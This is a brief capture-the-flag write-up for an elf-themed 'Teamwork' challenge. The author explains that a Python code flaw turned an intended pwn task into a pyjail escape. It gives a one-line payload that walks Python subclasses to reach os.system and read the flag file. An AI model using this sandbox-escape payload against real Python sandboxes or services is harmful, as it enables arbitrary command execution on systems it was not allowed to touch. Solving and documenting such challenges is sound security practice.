# Teamwork

Recently, the elves made few studies about their teamwork capabilities and the conclusion was that they are performing great, but they say that there's room for improvement. To achieve this goal, they written a demo software for coordinating their work even better.

Do you want to help them please and report any bugs you find?

---

This was supposed to be a standard pwn challenge, but there was a flaw in the Python code that allowed it to be a pyjail challenge instead.

```
[x for x in [].__class__.__base__.__subclasses__() if x.__name__ == "_wrap_close"][0].__init__.__globals__["system"]("cat home/ctf/flag.txt")
```
